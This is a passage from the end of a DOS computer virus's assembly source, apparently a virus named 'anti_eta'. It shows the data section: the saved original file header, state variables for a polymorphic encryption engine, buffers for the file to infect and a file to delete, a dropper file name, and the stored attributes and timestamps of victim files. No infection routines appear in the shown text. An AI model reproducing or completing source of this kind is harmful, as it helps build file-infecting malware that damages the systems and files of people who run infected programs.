;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

old_header      db 1Ch dup (00h)                ; Old file header
                dd 00000000h
virus_inf_end   equ this byte

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Virus data buffer (not inserted into infections)                         ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

                dd 00000000h
use_close       db 00h
use_terminate   db 00h
eng_recursive   db 00h
eng_loop_point  dw 0000h
eng_crypt_key   dw 0000h
eng_displace    dw 0000h
eng_entry_point dw 0000h
eng_init_ptr    dw 0000h
eng_cmp_ptr     dw 0000h
eng_exit_jmp    dw 0000h
randomize       dw 0000h                        ; Seed for random numbers
file_attr       dw 0000h                        ; Original file attribute
file_date       dw 0000h                        ; File date
file_time       dw 0000h                        ; ... and time
file_size       dd 00000000h                    ; Size of file to infect
inf_header      db 1Ch dup (00h)                ; Infected header
exec_filename   db 80h dup (00h)                ; File to infect
open_filename   db 80h dup (00h)                ; File to infect
delete_path     db 80h dup (00h)                ; File to delete
dropper_name    db 0Eh dup (00h)                ; Dropper file name
virus_mem_end   equ this byte

anti_eta        ends
                end entry_point
